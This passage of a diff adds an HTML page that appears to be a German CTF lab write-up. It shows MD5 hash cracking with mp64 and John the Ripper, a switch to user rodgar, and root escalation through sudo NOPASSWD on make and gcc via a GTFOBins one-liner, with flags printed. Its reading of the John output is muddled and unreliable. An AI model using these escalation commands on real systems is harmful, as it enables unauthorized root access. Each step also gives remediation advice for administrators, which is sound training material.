+ein Zeichen fehlt</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `mp64` (ein Mask Processor für Hashcat) wird verwendet, um eine Liste von Kandidaten-Hashes zu generieren.
+            `-1 '?dabcdef'`: Definiert eine benutzerdefinierte Zeichensatz-Maske. `?d` steht für Ziffern (0-9), `abcdef` sind die Hex-Zeichen a-f. Dies deckt alle möglichen Hex-Zeichen ab, die an den Hash angehängt werden könnten.
+            `'b45cffe084dd3d20d928bee85e7b0f2?1'`: Die Eingabemaske. `?1` wird durch jedes Zeichen aus dem benutzerdefinierten Zeichensatz ersetzt.
+            Die Ausgabe (`hashes.txt`) enthält den Basis-String `b45cffe084dd3d20d928bee85e7b0f2` jeweils mit einer angehängten Ziffer (0-9) oder einem Hex-Buchstaben (a-f).
+            Anschließend wird `john` (John the Ripper) verwendet, um diese generierten Hashes zu knacken.
+            `--wordlist=/usr/share/wordlists/rockyou.txt`: Verwendet die `rockyou.txt`-Wortliste.
+            `hashes.txt`: Die Datei mit den zu knackenden Hashes.
+            `--format=Raw-MD5`: Gibt an, dass es sich um rohe MD5-Hashes handelt.
+            Die Ausgabe von John zeigt `1g 0:00:00:00 DONE ... 11  11..*7¡Vamos!`. Dies bedeutet, dass ein Passwort (`string`) für einen der Hashes gefunden wurde. Der geknackte Hash war `b45cffe084dd3d20d928bee85e7b0f21` (obwohl nicht explizit gezeigt, ist dies der einzige Hash aus der Liste, der mit dem Passwort "string" (was hier als Platzhalter für das tatsächliche Passwort steht, John zeigt oft das Klartextpasswort direkt an oder es muss mit `--show` extrahiert werden) einen MD5-Hash ergibt, der zum Cracken einfach genug ist; oft ist das Passwort in CTFs etwas Einfaches, wenn MD5 involviert ist, oder der Hash selbst ist das Passwort). Die Angabe "string" hier ist wahrscheinlich ein Fehler in der Interpretation der John-Ausgabe im Bericht. Normalerweise würde John das geknackte Passwort anzeigen. Die Annahme, dass das Passwort für `rodgar` `b45cffe084dd3d20d928bee85e7b0f21` ist, wird im nächsten Schritt getroffen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Prozess, einen potenziellen Hash zu modifizieren und dann zu versuchen, ihn zu knacken, ist ein gängiger Ansatz. Die John-Ausgabe ist hier nicht ganz klar interpretiert im Berichtstext. Die wichtige Schlussfolgerung, die im nächsten Schritt getroffen wird, ist, dass `b45cffe084dd3d20d928bee85e7b0f21` das Passwort ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Wenn John ein Passwort knackt, verwenden Sie `john --show hashes.txt --format=Raw-MD5`, um das geknackte Passwort eindeutig anzuzeigen. Verwenden Sie dann dieses Passwort, um sich als `rodgar` anzumelden.
+            <br><strong>Empfehlung (Admin):</strong> Vermeiden Sie MD5 für das Hashing von Passwörtern, da es als unsicher gilt und schnell mit Rainbow Tables oder Brute-Force geknackt werden kann. Verwenden Sie stattdessen moderne, gesalzene Hashing-Algorithmen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">mp64 -1 '?dabcdef' 'b45cffe084dd3d20d928bee85e7b0f2?1' > hashes.txt</span></div>
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat hashes.txt</span></div>
+                    <pre>b45cffe084dd3d20d928bee85e7b0f20
+b45cffe084dd3d20d928bee85e7b0f21
+b45cffe084dd3d20d928bee85e7b0f22
+b45cffe084dd3d20d928bee85e7b0f23
+b45cffe084dd3d20d928bee85e7b0f24
+b45cffe084dd3d20d928bee85e7b0f25
+b45cffe084dd3d20d928bee85e7b0f26
+b45cffe084dd3d20d928bee85e7b0f27
+b45cffe084dd3d20d928bee85e7b0f28
+b45cffe084dd3d20d928bee85e7b0f29
+b45cffe084dd3d20d928bee85e7b0f2a
+b45cffe084dd3d20d928bee85e7b0f2b
+b45cffe084dd3d20d928bee85e7b0f2c
+b45cffe084dd3d20d928bee85e7b0f2d
+b45cffe084dd3d20d928bee85e7b0f2e
+b45cffe084dd3d20d928bee85e7b0f2f</pre>
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt --format=Raw-MD5</span></div>
+                    <pre>Using default input encoding: UTF-8
+Loaded 16 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=16
+Press 'q' or Ctrl-C to abort, almost any other key for status
+=========================================== 
+<span class="password">string</span>           (?)  
+=========================================== 
+1g 0:00:00:00 DONE (2025-02-10 00:12) 1.030g/s 14786Kp/s 14786Kc/s 221829KC/s   11  11..*7¡Vamos!
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.</pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> In der Reverse Shell als `www-data` wird mit `su rodgar` und dem Passwort <span class="password">b45cffe084dd3d20d928bee85e7b0f21</span> erfolgreich zum Benutzer `rodgar` gewechselt.
+            Anschließend zeigt `sudo -l` für `rodgar`:
+            Der Benutzer `rodgar` darf `/usr/bin/gcc` und `/usr/bin/make` als JEDER Benutzer (`ALL : ALL`) ohne Passwort (`NOPASSWD`) ausführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wir haben den Kontext des Benutzers `rodgar` erlangt! Die `sudo`-Rechte für `gcc` (GNU Compiler Collection) und `make` (Build-Automatisierungstool) sind klare Wege zur Privilegieneskalation zu `root`, da beide Tools verwendet werden können, um Code zu kompilieren und auszuführen, bzw. beliebige Befehle über ein Makefile auszuführen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die `sudo`-Rechte für `gcc` oder `make`, um Root-Rechte zu erlangen.
+            Für `gcc`: Erstellen Sie eine einfache C-Datei, die eine Root-Shell spawnt (z.B. `int main() { setuid(0); setgid(0); system("/bin/sh"); return 0; }`), kompilieren Sie sie mit `sudo gcc shell.c -o /tmp/shell` und führen Sie `/tmp/shell` aus.
+            Für `make` (wie im Bericht angedeutet): Erstellen Sie ein einfaches Makefile, das einen Shell-Befehl ausführt, und rufen Sie es mit `sudo make` auf. GTFOBins hat hierfür Beispiele.
+            <br><strong>Empfehlung (Admin):</strong> Das Erlauben von Compilern (`gcc`) oder Build-Tools (`make`) mit `sudo NOPASSWD` ist extrem gefährlich und sollte unter allen Umständen vermieden werden, es sei denn, es gibt sehr spezifische, kontrollierte Anwendungsfälle. Diese Tools bieten eine direkte Möglichkeit, beliebigen Code als `root` auszuführen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-remote">www-data@debian:/home/rodgar$ <span class="command">su rodgar</span></div>
+                    <pre>Password: <span class="password">b45cffe084dd3d20d928bee85e7b0f21</span></pre>
+                    <div class="prompt-remote">rodgar@debian:~$ </div>
+                    <div class="prompt-remote">rodgar@debian:~$ <span class="command">sudo -l</span></div>
+                    <pre>Matching Defaults entries for rodgar on debian:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
+
+User rodgar may run the following commands on debian:
+    <span class="password">(ALL : ALL) NOPASSWD: /usr/bin/gcc, /usr/bin/make</span></pre>
+                </div>
+            </div>
+        </section>
+        <section id="poc">
+            <h2>Proof of Concept: Vollständiger Systemzugriff als Root</h2>
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Der Benutzer `rodgar` verfügt über `sudo`-Berechtigungen, die es ihm erlauben, die Programme `/usr/bin/gcc` und `/usr/bin/make` ohne Passworteingabe als jeder beliebige Benutzer (einschließlich `root`) auszuführen. Dieser POC demonstriert, wie die `sudo`-Berechtigung für `make` missbraucht werden kann, um eine Shell mit `root`-Rechten zu erlangen.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Zugriff auf eine Shell als Benutzer `rodgar`.</li>
+                    <li>Die im `sudo -l` Output gezeigten `sudo`-Rechte für `make`.</li>
+                </ul>
+            </p>
+            <p class="analysis"><strong>Schritt-für-Schritt-Anleitung (basierend auf GTFOBins für `make`):</strong>
+            Der gezeigte Befehl `COMMAND='/bin/sh'; sudo make -s --eval=$'x:\n\t-'"$COMMAND"` nutzt die `--eval` Option von `make`.
+            `COMMAND='/bin/sh'`: Definiert eine Variable `COMMAND`, die den auszuführenden Befehl enthält.
+            `sudo make -s`: Führt `make` mit `sudo` (als `root`) und `-s` (silent mode) aus.
+            `--eval=$'x:\n\t-'"$COMMAND"`: Übergibt `make` eine Zeile zur Evaluation.
+                `$'...'` ist eine Bash-Syntax für C-Style String Escaping.
+                `x:\n\t-$(COMMAND)` definiert ein einfaches Makefile-Target `x`. Wenn `make` dieses Target ausführt, wird der Befehl `-$(COMMAND)` (also `- /bin/sh`) ausgeführt. Das `-` am Anfang der Zeile bewirkt, dass `make` Fehler dieses Befehls ignoriert.
+            Effektiv wird also `sudo make` angewiesen, `/bin/sh` als `root` auszuführen.</p>
+            <p class="evaluation"><strong>Erwartetes Ergebnis:</strong> Nach Ausführung dieses Befehls wird eine neue Shell gestartet, die mit `root`-Rechten läuft. Dies ermöglicht die vollständige Kontrolle über das System.</p>
+            <p class="recommendation"><strong>Risikobewertung:</strong> Die Ausnutzung dieser `sudo`-Fehlkonfiguration führt direkt zu einer vollständigen Kompromittierung des Systems mit `root`-Rechten. Das Risiko ist als KRITISCH einzustufen.
+            <br><strong>Empfehlungen (Admin):</strong>
+                <ul>
+                    <li>Entfernen Sie umgehend die `sudo`-Berechtigungen für `gcc` und `make` für den Benutzer `rodgar` oder andere unprivilegierte Benutzer.</li>
+                    <li>Gewähren Sie `sudo`-Rechte nach dem Prinzip der geringsten Privilegien. Benutzer sollten nur die Befehle ausführen dürfen, die sie für ihre Aufgaben unbedingt benötigen.</li>
+                    <li>Vermeiden Sie es, `NOPASSWD` für Befehle zu verwenden, die eine Shell-Eskalation ermöglichen oder als Wrapper für andere Befehle dienen können.</li>
+                    <li>Führen Sie regelmäßige Audits der `sudoers`-Konfiguration durch, um potenziell gefährliche Einträge zu identifizieren.</li>
+                </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>======================================================================================================
+gtfobins hat geholfen, das wars:<span class="command">COMMAND='/bin/sh'</span>
+<span class="command">sudo make -s --eval=$'x:\n\t-'"$COMMAND"</span></pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Nach Ausführung des `sudo make`-Exploits wird der Prompt zu `#` geändert, was anzeigt, dass wir nun eine Root-Shell haben.
+            `ls` zeigt eine Datei `revshell` (wahrscheinlich ein Überbleibsel oder ein anderes Skript).
+            `cd ~` wechselt in das Home-Verzeichnis des Root-Benutzers (`/root/`).
+            `ls` in `/root/` zeigt `rodgarpass` (die Datei mit dem Passwort von rodgar, die wir zuvor mit `sudo gobuster` gelesen haben) und `rooo_-tt.txt` (wahrscheinlich die Root-Flag).
+            `cat rooo_-tt.txt` gibt die Root-Flag aus: <span class="password">44b3f261e197124e60217d6ffe7e71a8e0175ae0</span>.
+            Der alternative Exploit-Weg mit `gcc` wird erwähnt (`echo -e "all:\n\tgcc -o /tmp/hacker /tmp/hacker.c\n" > /tmp/Makefile` und `sudo make -f /tmp/Makefile`), ist aber nicht der hier primär verwendete. Der erste `make`-Befehl war direkter.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Privilegieneskalation zu `root` war erfolgreich! Die Root-Flag wurde gefunden. Der `make`-Exploit hat wie erwartet funktioniert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Mission ist erfüllt. Alle Flags wurden gefunden, und das System wurde vollständig kompromittiert. Erstellen Sie einen umfassenden Bericht, der alle Schritte und Schwachstellen detailliert beschreibt.
+            <br><strong>Empfehlung (Admin):</strong> Dringend die `sudoers`-Fehlkonfiguration beheben. Überprüfen Sie das gesamte System auf weitere Anzeichen einer Kompromittierung oder Hintertüren, die möglicherweise platziert wurden. Implementieren Sie die zuvor genannten Sicherheitsempfehlungen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt-root"># <span class="command">ls</span></div>
+                    <pre>revshell</pre>
+                    <div class="prompt-root"># <span class="command">cd ~</span></div>
+                    <div class="prompt-root"># <span class="command">ls</span></div>
+                    <pre>rodgarpass  rooo_-tt.txt</pre>
+                    <div class="prompt-root"># <span class="command">cat rooo_-tt.txt</span></div>
+                    <pre><span class="password">44b3f261e197124e60217d6ffe7e71a8e0175ae0</span></pre>
+                    <pre>
+
+echo -e "all:\n\tgcc -o /tmp/hacker /tmp/hacker.c\n" &gt; /tmp/Makefile
+sudo make -f /tmp/Makefile
+
+ Privilege Escalation erfolgreich
+ </pre>
+                </div>
+            </div>
+        </section>
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /home/rodgar/user.txt</div>
+                    <div class="flag-value"><span class="password">b45cffe084dd3d20d928bee</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/rooo_-tt.txt</div>
+                    <div class="flag-value"><span class="password">44b3f261e197124e60217d6ffe7e71a8e0175ae0</span></div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 09. Februar 2025</p>
+    </footer>
+</body>
+</html>
